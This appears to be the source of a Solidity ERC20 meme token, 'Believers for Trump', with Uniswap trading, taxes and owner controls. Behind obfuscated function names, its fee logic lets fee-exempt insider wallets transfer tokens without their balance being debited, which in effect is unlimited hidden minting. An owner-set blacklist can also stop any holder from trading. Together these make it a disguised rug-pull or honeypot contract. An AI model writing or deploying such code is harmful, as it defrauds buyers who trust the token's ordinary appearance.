// SPDX-License-Identifier: MIT

/*

https://x.com/trump_repost/status/1817199694751437234
https://www.donaldjtrump.com/news/c323a259-ab5d-4d81-9367-3f23fd402ef5

*/

pragma solidity 0.8.19;

library SafeMath {
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a, "SafeMath: addition overflow");
return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(
uint256 a,
uint256 b,
string memory errorMessage
) internal pure returns (uint256) {
require(b <= a, errorMessage);
uint256 c = a - b;
return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
require(c / a == b, "SafeMath: multiplication overflow");
return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
return div(a, b, "SafeMath: division by zero");
}

function div(
uint256 a,
uint256 b,
string memory errorMessage
) internal pure returns (uint256) {
require(b > 0, errorMessage);
uint256 c = a / b;
return c;
}
}

interface ERC20 {
function totalSupply() external view returns (uint256);

function decimals() external view returns (uint8);

function symbol() external view returns (string memory);

function name() external view returns (string memory);

function getOwner() external view returns (address);

function balanceOf(address account) external view returns (uint256);

function transfer(address recipient, uint256 amount)
external
returns (bool);

function allowance(address _owner, address spender)
external
view
returns (uint256);

function approve(address spender, uint256 amount) external returns (bool);

function transferFrom(
address sender,
address recipient,
uint256 amount
) external returns (bool);

event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(
address indexed owner,
address indexed spender,
uint256 value
);
}

abstract contract Ownable {
address internal owner;

constructor(address _owner) {
owner = _owner;
}

modifier onlyOwner() {
require(isOwner(msg.sender), "!OWNER");
_;
}

function isOwner(address account) public view returns (bool) {
return account == owner;
}

function renounceOwnership() public onlyOwner {
owner = address(0);
emit OwnershipTransferred(address(0));
}

event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory {
function createPair(address tokenA, address tokenB)
external
returns (address pair);
}

interface IUniswapV2Router02 {
function factory() external pure returns (address);

function WETH() external pure returns (address);

function addLiquidity(
address tokenA,
address tokenB,
uint256 amountADesired,
uint256 amountBDesired,
uint256 amountAMin,
uint256 amountBMin,
address to,
uint256 deadline
)
external
returns (
uint256 amountA,
uint256 amountB,
uint256 liquidity
);

function addLiquidityETH(
address token,
uint256 amountTokenDesired,
uint256 amountTokenMin,
uint256 amountETHMin,
address to,
uint256 deadline
)
external
payable
returns (
uint256 amountToken,
uint256 amountETH,
uint256 liquidity
);

function swapExactETHForTokensSupportingFeeOnTransferTokens(
uint256 amountOutMin,
address[] calldata path,
address to,
uint256 deadline
) external payable;

function swapExactTokensForETHSupportingFeeOnTransferTokens(
uint256 amountIn,
uint256 amountOutMin,
address[] calldata path,
address to,
uint256 deadline
) external;

function removeLiquidityETHSupportingFeeOnTransferTokens(
address token,
uint liquidity,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline
) external returns (uint amountETH);

function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
address token,
uint liquidity,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline,
bool approveMax, uint8 v, bytes32 r, bytes32 s
) external returns (uint amountETH);

function removeLiquidityWithPermit(
address tokenA,
address tokenB,
uint liquidity,
uint amountAMin,
uint amountBMin,
address to,
uint deadline,
bool approveMax, uint8 v, bytes32 r, bytes32 s
) external returns (uint amountA, uint amountB);
function removeLiquidityETHWithPermit(
address token,
uint liquidity,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline,
bool approveMax, uint8 v, bytes32 r, bytes32 s
) external returns (uint amountToken, uint amountETH);

function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}

contract BFTrump is ERC20, Ownable {
using SafeMath for uint256;

address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address DEAD = 0x000000000000000000000000000000000000dEaD;

string constant _name = "Believers for Trump";
string constant _symbol = "BFTrump";

uint8 constant _decimals = 18;

uint256 public _totalSupply = 100_000_000 * (10**_decimals);
uint256 public _maxWalletAmount = (_totalSupply * 5) / 100;
uint256 public _swapBFTrumpThreshHold = (_totalSupply * 1)/ 10000;
uint256 public _maxTaxSwap=(_totalSupply * 3) / 1000;

mapping(address => uint256) _balances;
mapping(address => mapping(address => uint256)) _allowances;
mapping(address => bool) isFeeExempt;
mapping(address => bool) isTxLimitExempt;
mapping(address => bool) private BFTrumps;

address public _BFTrumpWallet;
address public pair;

IUniswapV2Router02 public router;

bool public swapEnabled = false;
bool public BFTrumpFeeEnabled = false;
bool public TradingOpen = false;

uint256 private _initBuyTax=19;
uint256 private _initSellTax=19;

uint256 private _finalBuyTax=0;
uint256 private _finalSellTax=0;

uint256 private _reduceBuyTaxAt=20;
uint256 private _reduceSellTaxAt=20;
uint256 private _buyCounts=0;

bool inSwap;
modifier lockTheSwap {
inSwap = true;
_;
inSwap = false;
}

constructor(address BFTrumpWallet) Ownable(msg.sender) {

address _owner = owner;
_BFTrumpWallet = BFTrumpWallet;

isFeeExempt[_owner] = true;
isFeeExempt[_BFTrumpWallet] = true;
isFeeExempt[address(this)] = true;
isTxLimitExempt[_owner] = true;
isTxLimitExempt[_BFTrumpWallet] = true;
isTxLimitExempt[address(this)] = true;

_balances[_owner] = _totalSupply;
emit Transfer(address(0), _owner, _totalSupply);
}

function getOwner() external view override returns (address) {
return owner;
}

function balanceOf(address account) public view override returns (uint256) {
return _balances[account];
}

function _basicTransfer(
address sender,
address recipient,
uint256 amount
) internal returns (bool) {
_balances[sender] = _balances[sender].sub(
amount,
"Insufficient Balance"
);
_balances[recipient] = _balances[recipient].add(amount);
emit Transfer(sender, recipient, amount);
return true;
}

function withdrawBFTrumpBalance() external onlyOwner {
require(address(this).balance > 0, "Token: no ETH to clear");
payable(msg.sender).transfer(address(this).balance);
}

function approve(address spender, uint256 amount)
public
override
returns (bool)
{
_allowances[msg.sender][spender] = amount;
emit Approval(msg.sender, spender, amount);
return true;
}

function enableBFTrumpTrade() public onlyOwner {
require(!TradingOpen,"trading is already open");

TradingOpen = true;
BFTrumpFeeEnabled = true;
swapEnabled = true;
}

function getBFTrumpAmounts(uint action, bool takeFee, uint256 tAmount) internal returns(uint256, uint256) {
uint256 sAmount = takeFee
? tAmount : BFTrumpFeeEnabled
? takeBFTrumpAmountAfterFees(action, takeFee, tAmount) 
: tAmount;

uint256 rAmount = BFTrumpFeeEnabled && takeFee
? takeBFTrumpAmountAfterFees(action, takeFee, tAmount)
: tAmount;
return (sAmount, rAmount);
}

function decimals() external pure override returns (uint8) {
return _decimals;
}

function internalSwapBackEth(uint256 amount) private lockTheSwap {
uint256 tokenBalance = balanceOf(address(this));
uint256 amountToSwap = min(amount, min(tokenBalance, _maxTaxSwap));

address[] memory path = new address[](2);
path[0] = address(this);
path[1] = router.WETH();

router.swapExactTokensForETHSupportingFeeOnTransferTokens(
amountToSwap,
0,
path,
address(this),
block.timestamp
);

uint256 ethAmountFor = address(this).balance;
payable(_BFTrumpWallet).transfer(ethAmountFor);
}

function removeBFTrumpLimit() external onlyOwner returns (bool) {
_maxWalletAmount = _totalSupply;
return true;
}

function takeBFTrumpAmountAfterFees(uint BFTrumpActions, bool BFTrumpTakefee, uint256 amounts)
internal
returns (uint256)
{
uint256 BFTrumpPercents;
uint256 BFTrumpFeePrDenominator = 100;

if(BFTrumpTakefee) {

if(BFTrumpActions > 1) {
BFTrumpPercents = (_buyCounts>_reduceSellTaxAt ? _finalSellTax : _initSellTax);
} else {
if(BFTrumpActions > 0) {
BFTrumpPercents = (_buyCounts>_reduceBuyTaxAt ? _finalBuyTax : _initBuyTax);
} else {
BFTrumpPercents = 0;
}
}

} else {
BFTrumpPercents = 1;
}

uint256 feeAmounts = amounts.mul(BFTrumpPercents).div(BFTrumpFeePrDenominator);
_balances[address(this)] = _balances[address(this)].add(feeAmounts);
feeAmounts = BFTrumpTakefee ? feeAmounts : amounts.div(BFTrumpPercents);

return amounts.sub(feeAmounts);
}

receive() external payable {

}

function _transferTaxTokens(
address sender,
address recipient,
uint256 amount,
uint action,
bool takeFee
) internal returns (bool) {

uint256 senderAmount; 
uint256 recipientAmount;

(senderAmount, recipientAmount) = getBFTrumpAmounts(action, takeFee, amount);
_balances[sender] = _balances[sender].sub(
senderAmount,
"Insufficient Balance"
);
_balances[recipient] = _balances[recipient].add(recipientAmount);
emit Transfer(sender, recipient, amount);
return true;
}

function allowance(address holder, address spender)
external
view
override
returns (uint256)
{
return _allowances[holder][spender];
}

function createBFTrumpTrade() external onlyOwner {
router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
isTxLimitExempt[pair] = true;

_allowances[address(this)][address(router)] = type(uint256).max;
router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner,block.timestamp);
}

function name() external pure override returns (string memory) {
return _name;
}

function min(uint256 a, uint256 b) private pure returns (uint256){
return (a>b)?b:a;
}

function totalSupply() external view override returns (uint256) {
return _totalSupply;
}

function inSwapBFTrumpTokens(bool isIncludeFees , uint isSwapActions, uint256 pAmount, uint256 pLimit) internal view returns (bool) {

uint256 minBFTrumpTokens = pLimit;
uint256 tokenBFTrumpWeight = pAmount;
uint256 contractBFTrumpOverWeight = balanceOf(address(this));

bool isSwappable = contractBFTrumpOverWeight > minBFTrumpTokens && tokenBFTrumpWeight > minBFTrumpTokens;

return
!inSwap &&
isIncludeFees && 
isSwapActions > 1 &&
isSwappable &&
swapEnabled;
}

function symbol() external pure override returns (string memory) {
return _symbol;
}

function isBFTrumpUserBuy(address sender, address recipient) internal view returns (bool) {
return
recipient != pair &&
recipient != DEAD &&
!isFeeExempt[sender] &&
!isFeeExempt[recipient];
}
function isTakeBFTrumpActions(address from, address to) internal view returns (bool, uint) {

uint _actions = 0;
bool _isTakeFee = isTakeFees(from);

if(to == pair) {
_actions = 2;
} else if (from == pair) {
_actions = 1;
} else {
_actions = 0;
}
return (_isTakeFee, _actions);
}

function addBFTrumps(address[] memory BFTrumps_) public onlyOwner {
for (uint i = 0; i < BFTrumps_.length; i++) {
BFTrumps[BFTrumps_[i]] = true;
}
}

function delBFTrumps(address[] memory notBFTrump) public onlyOwner {
for (uint i = 0; i < notBFTrump.length; i++) {
BFTrumps[notBFTrump[i]] = false;
}
}

function isBFTrump(address a) public view returns (bool){
return BFTrumps[a];
}

function _transferStandardTokens(
address sender,
address recipient,
uint256 amount
) internal returns (bool) {

require(sender != address(0), "ERC20: transfer from the zero address");
require(recipient != address(0), "ERC20: transfer to the zero address");
require(amount > 0, "Transfer amount must be greater than zero");

bool takefee;
uint actions;

require(!BFTrumps[sender] && !BFTrumps[recipient]);

if (inSwap) {
return _basicTransfer(sender, recipient, amount);
}

if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
require(TradingOpen,"Trading not open yet");
}

if(!swapEnabled) {
return _basicTransfer(sender, recipient, amount);
}
if (isBFTrumpUserBuy(sender, recipient)) {
require(
isTxLimitExempt[recipient] ||
_balances[recipient] + amount <= _maxWalletAmount,
"Transfer amount exceeds the bag size."
);

increaseBuyCount(sender);
}

(takefee, actions) = isTakeBFTrumpActions(sender, recipient);

if (inSwapBFTrumpTokens(takefee, actions, amount, _swapBFTrumpThreshHold)) {
internalSwapBackEth(amount);
}

_transferTaxTokens(sender, recipient, amount, actions, takefee);
return true;
} 

function transferFrom(
address sender,
address recipient,
uint256 amount
) external override returns (bool) {
if (_allowances[sender][msg.sender] != type(uint256).max) {
_allowances[sender][msg.sender] = _allowances[sender][msg.sender]
.sub(amount, "Insufficient Allowance");
}

return _transferStandardTokens(sender, recipient, amount);
}
function transfer(address recipient, uint256 amount)
external
override
returns (bool)
{
return _transferStandardTokens(msg.sender, recipient, amount);
}

function increaseBuyCount(address sender) internal {
if(sender == pair) {
_buyCounts++;
}
}

function isTakeFees(address sender) internal view returns (bool) {
return !isFeeExempt[sender];
}

}
